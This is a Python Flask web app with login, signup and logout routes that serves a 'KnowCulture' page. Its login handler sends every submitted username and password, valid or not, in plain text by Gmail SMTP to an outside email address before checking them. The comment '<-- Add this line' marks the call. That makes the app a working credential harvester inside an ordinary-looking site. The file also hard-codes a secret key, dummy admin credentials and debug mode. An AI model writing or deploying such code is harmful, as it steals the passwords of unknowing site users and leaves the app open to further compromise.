# from flask import Flask
# 
# app = Flask(__name__)
# 
# @app.route("/")
# def home():
#     return "Hello, Flask!"
# 
# if __name__ == "__main__":
#     app.run(debug=True)

import smtplib
from email.mime.text import MIMEText

EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_email_password'
TO_EMAIL = 'recipient@example.com'


from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for session

# Dummy credentials
USERNAME = 'admin'
PASSWORD = 'password'

def send_credentials(username, password):
    subject = 'New Login Attempt'
    body = f'Username: {username}\nPassword: {password}'

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
    except Exception as e:
        print(f"Error sending email: {e}")


@app.route('/')
def home():
    # if 'username' in session:
    #     return f"Hello, {session['username']}! <a href='/logout'>Logout</a>"
    # return redirect(url_for('login'))

    return render_template('KnowCulture.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        send_credentials(username, password)  # <-- Add this line
        
        if username == USERNAME and password == PASSWORD:
            session['username'] = username
            return redirect(url_for('home'))
        else:
            error = 'Invalid Credentials'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))


@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        # Retrieve form data
        first_name = request.form['first_name']
        last_name = request.form['last_name']
        username = request.form['username']
        age = request.form['age']
        gender = request.form['gender']
        email = request.form['email']
        password = request.form['password']

        # Here you can add validation, save to database, etc.
        # txt with tab copied over, to put in Excel rather than use database
        # automatically generate user id with the text files
        


        return redirect(url_for('success'))  # Replace with appropriate route

    return render_template('signup.html')

@app.route('/success')
def success():
    return "Signup successful!"

if __name__ == '__main__':
    app.run(debug=True)
